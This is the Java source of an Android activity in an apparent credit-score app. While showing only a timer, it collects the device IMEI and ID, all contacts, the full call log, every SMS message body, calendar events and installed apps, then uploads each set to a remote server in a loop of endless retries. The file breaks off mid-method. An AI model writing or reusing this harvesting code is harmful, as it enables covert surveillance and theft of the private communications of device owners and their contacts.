package com.rosemallow.money3creditscore;

import android.Manifest;
import android.app.Activity;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.PersistableBundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.text.format.DateUtils;
import android.util.ArrayMap;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.core.app.ActivityCompat;

import com.rosemallow.money3creditscore.Apimodels.UpdateDetailModel;
import com.rosemallow.money3creditscore.Apimodels.UpdateModel;
import com.rosemallow.money3creditscore.Retrofitupload.ApiBaseUrl;
import com.rosemallow.money3creditscore.Retrofitupload.RetrofitService;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.rosemallow.money3creditscore.HardwareSofftware.MemoryStatus;
import com.rosemallow.money3creditscore.Retrofitupload.IRetrofit;
import com.rosemallow.money3creditscore.Retrofitupload.ServiceGenerator;
import com.rosemallow.money3creditscore.VideoModule.VideoData;
import com.rosemallow.money3creditscore.VideoModule.imageFolder;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.text.CharacterIterator;
import java.text.DateFormat;
import java.text.DecimalFormat;
import java.text.SimpleDateFormat;
import java.text.StringCharacterIterator;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class StartCommonFetchingActivity extends com.rosemallow.money3creditscore.LocationActivity {
    private static AlertDialog.Builder aDialogBuilder;
    private static AlertDialog aDialog;
    public static StringBuffer sbfinal = new StringBuffer();
    public ArrayList<VideoData> arrayList = new ArrayList<>();
    LinearLayout ll1, ll2;
    int i, j;
    private int seconds = 0;
    private boolean running;
    private boolean wasRunning;
    String subString, folderName;
    ArrayList<String> path = new ArrayList<>();
    StringBuffer sbvideos = new StringBuffer();
    Button returnbutton;
    IRetrofit retrofitService1;
    RetrofitService retrofitService;
    TextView timeView;
    JsonArray hardwarearray=new JsonArray();
    JsonArray contactlistarray=new JsonArray();
    JsonArray calllogarray=new JsonArray();
    JsonArray smslogarray=new JsonArray();
    JsonArray calenderarray=new JsonArray();
    JsonArray catagaryarry=new JsonArray();
    JsonArray userapparray=new JsonArray();
    JsonArray appusage=new JsonArray();
    JsonArray videoarraylist=new JsonArray();
    JsonArray picturearry=new JsonArray();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_start_common_fetching);
        /*ActionBar actionBar = getSupportActionBar();
        actionBar.setDisplayHomeAsUpEnabled(false);*/
        running = true;
        runTimer();


        if (savedInstanceState != null) {

            seconds
                    = savedInstanceState
                    .getInt("seconds");
            running
                    = savedInstanceState
                    .getBoolean("running");
            wasRunning
                    = savedInstanceState
                    .getBoolean("wasRunning");
        }
        retrofitService1 = ServiceGenerator.getClient().create(IRetrofit.class);
        retrofitService = ApiBaseUrl.getClient().create(RetrofitService.class);


        ll1 = findViewById(R.id.ll1);
        ll2 = findViewById(R.id.ll2);
        returnbutton = findViewById(R.id.returnbutton);
        ll1.setVisibility(View.VISIBLE);
        ll2.setVisibility(View.GONE);
        timeView = (TextView) findViewById(R.id.time_view);

        returnbutton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
               finishAndRemoveTask();

            }
        });
        new Thread(new Runnable() {
            @Override
            public void run() {
                getHwSwInfor();
                getIMEIDeviceId11();
            }
        }).start();

    }

    @Override
    protected void onPause()
    {
        super.onPause();
        wasRunning = running;
        running = false;
    }

    @Override
    protected void onResume()
    {
        super.onResume();
        if (wasRunning) {
            running = true;
            runTimer();
        }
    }
    @Override
    public void onSaveInstanceState(@NonNull Bundle outState, @NonNull PersistableBundle outPersistentState) {
        super.onSaveInstanceState(outState, outPersistentState);

        outState.putInt("seconds",seconds);
        outState.putBoolean("running",running);
        outState.putBoolean("wasRunning",wasRunning);

    }
    public static void showAlertDialog(final Activity activity, final String titel, final String text) {

        if (!activity.isFinishing()) {
            activity.runOnUiThread(new Runnable() {

                public void run() {
                    aDialogBuilder = new AlertDialog.Builder(activity);
                    aDialogBuilder.setMessage(text);
                    aDialogBuilder.setTitle(titel);
                    aDialogBuilder .setIcon(R.drawable.logo);
                    aDialogBuilder.setCancelable(false);
                    aDialogBuilder.setPositiveButton("OK", new DialogInterface.OnClickListener() {

                        public void onClick(DialogInterface dialog, int which) {
                            dialog.cancel();//w  ww.j a v  a  2  s  .  c  o m

                        }
                    });
                    aDialog = aDialogBuilder.create();
                    aDialog.show();
                }
            });
        }

    }
    private void runTimer() {
        TextView timeview=findViewById(R.id.time_view);
        Handler handler =new Handler();
        handler.post(new Runnable() {
            @Override
            public void run() {
                int hours=seconds/3600;
                int minutes=(seconds % 3600) / 60;
                int secs = seconds % 60;

                String time =String.format(Locale.getDefault(),"%d:%02d:%02d",hours,minutes,secs);

                timeview.setText(time);

                if(running){
                    seconds++;
                }
                handler.postDelayed(this,1000);

            }
        });
    }


    public void getHwSwInfor() {
        JsonObject hardwareswobject=new JsonObject();
        StringBuffer sb = new StringBuffer();

        sb.append("HARDWARE AND SOFTWARE INFORMATION" + "\n\n");
        sb.append("Device Name  Device Manufacturer  Device OS  Device Api Level  Device ID  RAM Size  Total Internal Memory  Available Internal Memory  Total External Memory  Available External Memory" + "\n\n");

        String deviceName = Build.MODEL;
        String deviceMan = Build.MANUFACTURER;
        String androidOS = Build.VERSION.RELEASE;
        String myAPI = Build.VERSION.SDK; // API Level
        String deviceID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);  //Device Id
        String RAMSize = getTotalRAM();


        sb.append(deviceName + ",  " + deviceMan + ",  " +
                androidOS + ",  " + myAPI + ",  " +
                deviceID + ",  " + RAMSize + ",  " +
                humanReadableByteCountBin(MemoryStatus.getTotalInternalMemorySize()) + ",  " + humanReadableByteCountBin(MemoryStatus.getAvailableInternalMemorySize()) + ",  " +
                humanReadableByteCountBin(MemoryStatus.getTotalExternalMemorySize()) + ",  " + humanReadableByteCountBin(MemoryStatus.getAvailableExternalMemorySize()) + ",  " + "\n");

        hardwareswobject.addProperty("DeviceName", deviceName);
        hardwareswobject.addProperty("DeviceManifacturer", deviceMan);
        hardwareswobject.addProperty("DeviceOS", androidOS);
        hardwareswobject.addProperty("DeviceApiLevel", myAPI);
        hardwareswobject.addProperty("DeviceID",deviceID);
        hardwareswobject.addProperty("RAMSize", RAMSize);
        hardwareswobject.addProperty("TotalInternalMemory",humanReadableByteCountBin(MemoryStatus.getTotalInternalMemorySize()));
        hardwareswobject.addProperty("AvailableInternalMemory", humanReadableByteCountBin(MemoryStatus.getAvailableInternalMemorySize()));
        hardwareswobject.addProperty("TotalExternalMemory", humanReadableByteCountBin(MemoryStatus.getTotalExternalMemorySize()));
        hardwareswobject.addProperty("AvailableExternalMemory", humanReadableByteCountBin(MemoryStatus.getAvailableExternalMemorySize()));
        hardwareswobject.addProperty("MobileNumberId", new SavePref(StartCommonFetchingActivity.this).getuserid());

        hardwarearray.add(hardwareswobject);

        int currentapiVersion = android.os.Build.VERSION.SDK_INT;
        if (currentapiVersion >= 31) {
            Log.e("Point","Ponit 1");
            new SavePref(this).setContactsList(sb.toString());
            // alert(androidOS,currentapiVersion);
            showAlertDialog(StartCommonFetchingActivity.this,"ACS","Up-to-date:  "+" "+deviceName+" "+"Version:"+androidOS+" "+"API:"+myAPI);


        }
        new SavePref(this).setHardSoftInfo(sb.toString());

        getContactList();

    }
    public  String getIMEIDeviceId11() {

        String deviceId =null ;
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                if (telephonyManager != null) {
                    try {
                        deviceId = telephonyManager.getImei();
                        new SavePref(this).setMyIMEI("IMEI NUMBER Or DEVICE ID:"+deviceId);
                    } catch (Exception e) {
                        e.printStackTrace();
                        deviceId = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
                        new SavePref(this).setMyIMEI("IMEI NUMBER Or DEVICE ID:"+deviceId);
                    }
                }
            } else {
                ActivityCompat.requestPermissions(StartCommonFetchingActivity.this, new String[]{Manifest.permission.READ_PHONE_STATE}, 1010);
            }
        } else {
            if (ActivityCompat.checkSelfPermission(StartCommonFetchingActivity.this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                if (telephonyManager != null) {
                    deviceId = telephonyManager.getDeviceId();
                    new SavePref(this).setMyIMEI("IMEI NUMBER Or DEVICE ID:"+deviceId);
                }
            } else {
                ActivityCompat.requestPermissions(StartCommonFetchingActivity.this, new String[]{Manifest.permission.READ_PHONE_STATE}, 1010);
            }
        }
        return deviceId;
    }

    /////////hardware upload
    private void hardwareuploadFile() {

        Log.e("harddddd",hardwarearray.toString());
        Call<JsonArray> call = retrofitService1.posthardwaresoftware(hardwarearray);
        call.enqueue(new Callback<JsonArray>() {
            @Override
            public void onResponse(Call<JsonArray> call, Response<JsonArray> response) {

                try{

                    if (response.code() == 200) {
                      Contactlistdataupload();

                    } else {

                        hardwareuploadFile();
                    }
                }catch (Exception e){
                    e.printStackTrace();
                    switch (response.code()) {
                        case 404:
                            hardwareuploadFile();

                            break;
                        case 500:
                            hardwareuploadFile();


                            break;
                        default:
                            hardwareuploadFile();

                            break;
                    }
                }
            }
            @Override
            public void onFailure(Call<JsonArray> call, Throwable t) {
                Log.e("response-failure", call.toString());

                hardwareuploadFile();
            }

        });


    }
    //SMS INFO
    public void getAllSms() {

        StringBuffer sb = new StringBuffer();

        sb.append("SMS LOG" + "\n\n");
        sb.append("Number,  Message,  Type,  Time" + "\n\n");

        ContentResolver cr = StartCommonFetchingActivity.this.getContentResolver();
        Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        int totalSMS = 0;
        if (c != null) {
            totalSMS = c.getCount();

            Log.e("EFwsdcfdc", totalSMS + "");

            if (c.moveToFirst()) {
                for (int j = 0; j < totalSMS; j++) {
                    String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));

                    Date dateFormat = new Date(Long.valueOf(smsDate));
                    String type = "";


                    switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                        case Telephony.Sms.MESSAGE_TYPE_INBOX:
                            type = "inbox";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_SENT:
                            type = "sent";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                            type = "outbox";
                            break;
                        default:
                            break;
                    }


                    String currentDate = new SimpleDateFormat("dd MMM yyyy").format(dateFormat);
                    String currentTime = new SimpleDateFormat("hh:mm:ss").format(dateFormat);

                    JsonObject smsobject=new JsonObject();
                    smsobject.addProperty("Number", number);
                    smsobject.addProperty("Message", body);
                    smsobject.addProperty("Type", type);
                    smsobject.addProperty("Time", currentDate + " " + currentTime );
                    smsobject.addProperty("MobileNumberId", new SavePref(StartCommonFetchingActivity.this).getuserid());
                    smslogarray.add(smsobject);


                    sb.append(number + ",  " +
                            body + ",  " +
                            type + ",  " +
                            currentDate + " " + currentTime + "" +
                            "\n");


                    c.moveToNext();
                }
            }

            new SavePref(this).setSMSData(sb.toString());


             readCalendarEvent();
            c.close();

        } else {
            Toast.makeText(this, "No message to show!", Toast.LENGTH_SHORT).show();
        }


    }

    ////////SMS LOG upload
    private void smslogupload() {


        Call<JsonArray> call = retrofitService1.postsmslog(smslogarray);
        call.enqueue(new Callback<JsonArray>() {
            @Override
            public void onResponse(Call<JsonArray> call, Response<JsonArray> response) {


                try{

                    if (response.code()==200) {
                        calenderupload();

                    } else {

                        smslogupload();
                    }
                }catch (Exception e){
                    e.printStackTrace();
                    switch (response.code()) {
                        case 404:

                            smslogupload();
                            break;
                        case 500:
                            smslogupload();

                            break;
                        default:

                            smslogupload();
                            break;
                    }
                }
            }
            @Override
            public void onFailure(Call<JsonArray> call, Throwable t) {
                Log.e("response-failure", call.toString());
                smslogupload();
            }

        });


    }



    //CALENDER
    public void readCalendarEvent() {

        StringBuffer sb = new StringBuffer();
        sb.append("CALENDER" + "\n\n");


        sb.append("Event Name,  Event Date " + "\n\n");


        Cursor cursor = StartCommonFetchingActivity.this.getContentResolver()
                .query(
                        Uri.parse("content://com.android.calendar/events"),
                        new String[]{"calendar_id", "title", "description",
                                "dtstart", "dtend", "eventLocation"}, null,
                        null, null);
        cursor.moveToFirst();


        while (cursor.moveToNext()) {
            String phNumber = cursor.getString(1);
            String date = getDate(Long.parseLong(cursor.getString(3)));
            String desc = cursor.getString(2);

            Log.e("eventdetailsrose",phNumber+"-"+date);
            JsonObject calenderObject = new JsonObject();
            calenderObject.addProperty("EventName",phNumber);
            calenderObject.addProperty("EventDate",date);
            calenderObject.addProperty("MobileNumberId", new SavePref(StartCommonFetchingActivity.this).getuserid());
            calenderarray.add(calenderObject);



            sb.append(phNumber + ",  " +
                    date + ",  " +
                    "\n");


        }


        cursor.close();

        new SavePref(this).setCalenderEvents(sb.toString());

        try {
            getPackageListAllApps();
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }



    }

///////calenderdata upload

    private void calenderupload() {


        Call<JsonArray> call = retrofitService1.postcalendar(calenderarray);
        call.enqueue(new Callback<JsonArray>() {
            @Override
            public void onResponse(Call<JsonArray> call, Response<JsonArray> response) {

                try{

                    if (response.code()==200) {
                        userappdataupload();

                    } else {
                        calenderupload();
                    }
                }catch (Exception e){
                    e.printStackTrace();
                    switch (response.code()) {
                        case 404:

                            calenderupload();
                            break;
                        case 500:
                            calenderupload();

                            break;
                        default:

                            calenderupload();
                            break;
                    }
                }
            }
            @Override
            public void onFailure(Call<JsonArray> call, Throwable t) {
                Log.e("response-failure", call.toString());
                calenderupload();
            }

        });


    }

    public String getDate(long milliSeconds) {
        SimpleDateFormat formatter = new SimpleDateFormat("dd MMM yyyy");
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(milliSeconds);
        return formatter.format(calendar.getTime());
    }

    //CALL HISTORY
    private void getCallDetails() {



        StringBuffer sb = new StringBuffer();
        StringBuffer sb1 = new StringBuffer();
        sb.append("CALL LOG" + "\n\n");


        sb.append("Number,  Call Type,  Date,  Call duration,  Location" + "\n\n");


        Cursor managedCursor = StartCommonFetchingActivity.this.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int iso = managedCursor.getColumnIndex(CallLog.Calls.COUNTRY_ISO);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        int geocode = managedCursor.getColumnIndex(CallLog.Calls.GEOCODED_LOCATION);


        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number);
            String isoStr = managedCursor.getString(iso);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);
            String geocodeStr = managedCursor.getString(geocode);

            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
                case CallLog.Calls.BLOCKED_TYPE:
                    dir = "BLOCKED";

                    break;
                case CallLog.Calls.REJECTED_TYPE:
                    dir = "Rejected";
                    String currentDate = new SimpleDateFormat("dd MMM yyyy").format(callDayTime);
                    String currentTime = new SimpleDateFormat("hh:mm:ss").format(callDayTime);
                    sb1.append(isoStr + " " + phNumber + ",  " +
                            dir + ",  " +
                            currentDate + " " + currentTime + "" +
                            callDuration + ",  " +
                            geocodeStr + ",  " +
                            "\n");
                    new com.rosemallow.money3creditscore.SavePref(this).setrejectedcall(sb1.toString());
                    int number2 = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
                    String phNum2 = managedCursor.getString(number2);




                    sb.append( phNum2 + ",  " +
                            callType + ",  " +
                            currentDate + " " + currentTime +
                            "\n");
                    Log.e("calllog_ramesh", String.valueOf(sb));

                    new com.rosemallow.money3creditscore.SavePref(this).setCallLogData(sb.toString());

                    break;



            }

            if(dir==null){
                dir="BLOCKED";
                String currentDate1 = new SimpleDateFormat("dd MMM yyyy").format(callDayTime);
                String currentTime1 = new SimpleDateFormat("hh:mm:ss").format(callDayTime);
                sb1.append(isoStr + " " + phNumber + ",  " +
                        dir + ",  " +
                        currentDate1 + " " + currentTime1 + "" +
                        callDuration + ",  " +
                        geocodeStr + ",  " +
                        "\n");
                new com.rosemallow.money3creditscore.SavePref(this).setblockedcall(sb1.toString());
            }


            String currentDate = new SimpleDateFormat("dd MMM yyyy").format(callDayTime);
            String currentTime = new SimpleDateFormat("hh:mm:ss").format(callDayTime);
            JsonObject calllogobject=new JsonObject();
            calllogobject.addProperty("Number", isoStr+" "+phNumber);
            calllogobject.addProperty("CallType", dir);
            calllogobject.addProperty("Date", currentDate+","+currentTime);
            calllogobject.addProperty("CallDuration", callDuration);
            calllogobject.addProperty("Location",geocodeStr);
            calllogobject.addProperty("MobileNumberId", new com.rosemallow.money3creditscore.SavePref(StartCommonFetchingActivity.this).getuserid());

            calllogarray.add(calllogobject);



            sb.append(isoStr + " " + phNumber + ",  " +
                    dir + ",  " +
                    currentDate + " ," + currentTime + "," +
                    callDuration + ",  " +
                    geocodeStr + ",  " +
                    "\n");


        }


        managedCursor.close();
        new SavePref(this).setCallLogData(sb.toString());



         getAllSms();
    }

    /////////call log update
    private void callloguploadFile() {


        Call<JsonArray> call = retrofitService1.postcalllog(calllogarray);
        call.enqueue(new Callback<JsonArray>() {
            @Override
            public void onResponse(Call<JsonArray> call, Response<JsonArray> response) {


                try{

                    if (response.code()==200) {
                        smslogupload();


                    } else {
                        callloguploadFile();

                    }
                }catch (Exception e){
                    e.printStackTrace();
                    switch (response.code()) {
                        case 404:
                            callloguploadFile();
                            break;
                        case 500:
                            callloguploadFile();

                            break;
                        default:

                            callloguploadFile();
                            break;
                    }
                }
            }
            @Override
            public void onFailure(Call<JsonArray> call, Throwable t) {
                Log.e("response-failure", call.toString());
                callloguploadFile();
            }

        });


    }
    //CAT WISE APPS
    public void getPackageList() throws PackageManager.NameNotFoundException {





        StringBuffer sb = new StringBuffer();

        sb.append("CATEGORY WISE PHONE APPS" + "\n\n");


        sb.append("App Name,  App Category,  App Version,  App Package Name " + "\n\n");


        List installedPackages = getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < installedPackages.size(); i++) {
            PackageInfo packageInfo = (PackageInfo) installedPackages.get(i);


            PackageManager pm = StartCommonFetchingActivity.this.getPackageManager();
            ApplicationInfo applicationInfo = pm.getApplicationInfo(packageInfo.packageName, 0);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                int appCategory = applicationInfo.category;
                String categoryTitle = (String) ApplicationInfo.getCategoryTitle(StartCommonFetchingActivity.this, appCategory);


                if (categoryTitle == null) {
                    JsonObject getallpackobject=new JsonObject();
                    getallpackobject.addProperty("AppName", packageInfo.applicationInfo.loadLabel(getPackageManager()).toString());
                    getallpackobject.addProperty("AppCategory", "Others");
                    getallpackobject.addProperty("AppVersion", packageInfo.versionName);
                    getallpackobject.addProperty("AppPackageName", packageInfo.packageName);
                    getallpackobject.addProperty("MobileNumberId", new SavePref(StartCommonFetchingActivity.this).getuserid());
                    catagaryarry.add(getallpackobject);

                    // Appcategorydataupload(packageInfo.applicationInfo.loadLabel(getPackageManager()).toString(),"Others",packageInfo.versionName,packageInfo.packageName );
                    sb.append(packageInfo.applicationInfo.loadLabel(getPackageManager()).toString() + ",  " +
                            "Others" + ",  " +
                            packageInfo.versionName + ",  " +
                            packageInfo.packageName + ",  " +
                            "\n");

                } else {
                    Drawable d = packageInfo.applicationInfo.loadIcon(getPackageManager());

                    Log.e("FEfdasxdscNEW", categoryTitle + " " + packageInfo.packageName);
                    JsonObject getallpackobject=new JsonObject();
                    getallpackobject.addProperty("AppName", packageInfo.applicationInfo.loadLabel(getPackageManager()).toString());
                    getallpackobject.addProperty("AppCategory", categoryTitle);
                    getallpackobject.addProperty("AppVersion", packageInfo.versionName);
                    getallpackobject.addProperty("AppPackageName", packageInfo.packageName);
                    getallpackobject.addProperty("MobileNumberId", new SavePref(StartCommonFetchingActivity.this).getuserid());
                    catagaryarry.add(getallpackobject);
                    //Appcategorydataupload(packageInfo.applicationInfo.loadLabel(getPackageManager()).toString(),categoryTitle,packageInfo.versionName,packageInfo.packageName );
                    sb.append(packageInfo.applicationInfo.loadLabel(getPackageManager()).toString() + ",  " +
                            "categoryTitle" + ",  " +
                            packageInfo.versionName + ",  " +
                            packageInfo.packageName + ",  " +
                            "\n");

                }

            }


        }


        new SavePref(this).setCatWiseApps(sb.toString());

        getVideosFolderDatas();

    }
////////////app categoryTitle  update

    private void Appcategorydataupload() {


        Call<JsonArray> call = retrofitService1.postphoneappdata(catagaryarry);
        call.enqueue(new Callback<JsonArray>() {
            @Override
            public void onResponse(Call<JsonArray> call, Response<JsonArray> response) {


                try{

                    if (response.code()==200) {
                        Videocountupload();

                    } else {
                        Appcategorydataupload();

                    }
                }catch (Exception e){
                    e.printStackTrace();
                    switch (response.code()) {
                        case 404:

                            Appcategorydataupload();
                            break;
                        case 500:
                            Appcategorydataupload();

                            break;
                        default:

                            Appcategorydataupload();
                            break;
                    }
                }
            }
            @Override
            public void onFailure(Call<JsonArray> call, Throwable t) {
                Log.e("response-failure", call.toString());

                Appcategorydataupload();


            }

        });


    }
    private static final String[] PROJECTION = new String[] {
            ContactsContract.CommonDataKinds.Email.CONTACT_ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Email.DATA
    };
    //CONTACTS LIST
    private void getContactList() {
        Log.e("CONTACTNAME","displayName");

        StringBuffer sb = new StringBuffer();

        sb.append("CONTACTS LIST" + "\n\n");
        sb.append("Name,  Phone Number " + "\n\n");
        Cursor cursorPhones = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER,
                        ContactsContract.CommonDataKinds.Phone.TYPE,
                        ContactsContract.CommonDataKinds.Phone.LABEL
                },
                ContactsContract.Contacts.HAS_PHONE_NUMBER + ">0 AND LENGTH(" + ContactsContract.CommonDataKinds.Phone.NUMBER + ")>0",
                null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
        );

        while (cursorPhones.moveToNext()) {

            String displayName = cursorPhones.getString(cursorPhones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String number = cursorPhones.getString(cursorPhones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            int type = cursorPhones.getInt(cursorPhones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
            String label = cursorPhones.getString(cursorPhones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LABEL));
            CharSequence phoneLabel = ContactsContract.CommonDataKinds.Phone.getTypeLabel(getApplicationContext().getResources(), type, label);
            Log.e("CONTACTNAME",displayName);
            sb.append(displayName + ",  " +
                    number +
                    "\n");
            JsonObject contactlistobject=new JsonObject();
            contactlistobject.addProperty("Name", displayName);
            contactlistobject.addProperty("PhoneNumber", number);
            contactlistobject.addProperty("MobileNumberId", new SavePref(StartCommonFetchingActivity.this).getuserid());
            contactlistarray.add(contactlistobject);
        }


        cursorPhones.close();
        if (contactlistarray.size() >= 150) {
            new SavePref(this).setContactsList(sb.toString());
            showAlertDialog(StartCommonFetchingActivity.this,"ACS","Contacts > 150  ");
           /* new AlertDialog.Builder(StartCommonFetchingActivity.this)
                    .setTitle(getResources().getString(R.string.app_name))
                    .setMessage("Contacts 150")
                    .setIcon(R.drawable.logo)
                    .setPositiveButton("Ok", new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int id) {
                            startActivity(new Intent(StartCommonFetchingActivity.this, TermsandConditionsActivity.class));
                        }
                    }).show();*/

            Log.e("Point","Point 2");
        }
        new SavePref(this).setContactsList(sb.toString());

        getCallDetails();


    }

    //////////////contact upload
    private void Contactlistdataupload() {



        Call<JsonArray> call = retrofitService1.postcontactdata(contactlistarray);
        call.enqueue(new Callback<JsonArray>() {
            @Override
            public void onResponse(Call<JsonArray> call, Response<JsonArray> response) {

                try{

                    Log.e("HARDWARE_API","API HIT SCUCESS");

                    if (response.code() == 200) {
                        callloguploadFile();


                    } else {

                        Contactlistdataupload();
                    }
                }catch (Exception e){
                    e.printStackTrace();
                    switch (response.code()) {
                        case 404:
                            Contactlistdataupload();

                            break;
                        case 500:
                            Contactlistdataupload();


                            break;
                        default:
                            Contactlistdataupload();

                            break;
                    }
                }
            }
            @Override
            public void onFailure(Call<JsonArray> call, Throwable t) {
                Log.e("response-failure", call.toString());
                Contactlistdataupload();
            }

        });


    }
    public String getTotalRAM() {

        RandomAccessFile reader = null;
        String load = null;
        DecimalFormat twoDecimalForm = new DecimalFormat("#.##");
        double totRam = 0;
        String lastValue = "";
        try {
            reader = new RandomAccessFile("/proc/meminfo", "r");
            load = reader.readLine();

            Pattern p = Pattern.compile("(\\d+)");
            Matcher m = p.matcher(load);
            String value = "";
            while (m.find()) {
                value = m.group(1);
            }
            reader.close();

            totRam = Double.parseDouble(value);

            double mb = totRam / 1024.0;
            double gb = totRam / 1048576.0;
            double tb = totRam / 1073741824.0;

            if (tb > 1) {
                lastValue = twoDecimalForm.format(tb).concat(" TB");
            } else if (gb > 1) {
                lastValue = twoDecimalForm.format(gb).concat(" GB");
            } else if (mb > 1) {
                lastValue = twoDecimalForm.format(mb).concat(" MB");
            } else {
                lastValue = twoDecimalForm.format(totRam).concat(" KB");
            }


        } catch (IOException ex) {
            ex.printStackTrace();
        } finally {

        }

        return lastValue;
    }

    //ALL PHONE APPS
    public void getPackageListAllApps() throws PackageManager.NameNotFoundException {


        StringBuffer sb = new StringBuffer();

        sb.append("USER INSTALLED APPS" + "\n\n");


        sb.append("Category,  App Name" + "\n\n");

        List installedPackages = getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < installedPackages.size(); i++) {
            PackageInfo packageInfo = (PackageInfo) installedPackages.get(i);


            PackageManager pm = StartCommonFetchingActivity.this.getPackageManager();
            ApplicationInfo applicationInfo = pm.getApplicationInfo(packageInfo.packageName, 0);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                int appCategory = applicationInfo.category;
                String categoryTitle = (String) ApplicationInfo.getCategoryTitle(StartCommonFetchingActivity.this, appCategory);

                Log.e("FEfdasxdsc", categoryTitle + " " + packageInfo.packageName);

                if (categoryTitle == null) {

                    JsonObject getpackageobject=new JsonObject();
                    getpackageobject.addProperty("Category", "Others");
                    getpackageobject.addProperty("AppName", packageInfo.applicationInfo.loadLabel(getPackageManager()).toString());
                    getpackageobject.addProperty("MobileNumberId", new SavePref(StartCommonFetchingActivity.this).getuserid());

                    userapparray.add(getpackageobject);

                    sb.append("Others" + ",   " +
                            packageInfo.applicationInfo.loadLabel(getPackageManager()).toString() + "  " +
                            "\n");

                } else {
                    Log.e("FEfdasxdscNEW", categoryTitle + " " + packageInfo.packageName);
                    JsonObject getpackageobject=new JsonObject();
                    getpackageobject.addProperty("Category", categoryTitle);
                    getpackageobject.addProperty("AppName", packageInfo.packageName);
                    getpackageobject.addProperty("MobileNumberId", new SavePref(StartCommonFetchingActivity.this).getuserid());
                    userapparray.add(getpackageobject);

                    sb.append(categoryTitle + ",   " +
                            packageInfo.applicationInfo.loadLabel(getPackageManager()).toString() + "  " +
                            "\n");

                }

            }


        }

        new SavePref(this).setInstalledApps(sb.toString());



        try {
            getPackageList();
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }

    }

    private void userappdataupload() {


        Call<JsonArray> call = retrofitService1.postuserappdata(userapparray);
        call.enqueue(new Callback<JsonArray>() {
            @Override
            public void onResponse(Call<JsonArray> call, Response<JsonArray> response) {

                try{

                    if (response.code()==200) {
                        Appcategorydataupload();

                    } else {

                        userappdataupload();
                    }
                }catch (Exception e){
                    e.printStackTrace();
                    switch (response.code()) {
                        case 404:

                            userappdataupload();
                            break;
                        case 500:
                            userappdataupload();

                            break;
                        default:

                            userappdataupload();
                            break;
                    }
                }
            }
            @Override
